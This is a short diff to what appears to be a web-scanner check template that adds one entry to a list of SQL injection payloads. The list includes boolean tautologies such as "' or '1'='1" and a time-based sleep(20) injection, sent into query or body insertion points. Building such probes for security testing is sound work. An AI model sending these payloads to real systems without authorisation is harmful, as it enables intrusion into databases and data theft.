@@ -5,7 +5,7 @@ metadata:
     author: "nu11secur1tuy"
 
 run for each:
-    puncher = "nu11secur1ty' or 1=1#","'","'+OR+1=1--","'+(select*from(select(sleep(20)))a)+'"
+    puncher = "nu11secur1ty' or 1=1#","'","'+OR+1=1--","'+(select*from(select(sleep(20)))a)+'","' or '1'='1"
 
 given query or body insertion point then
     send payload called check:
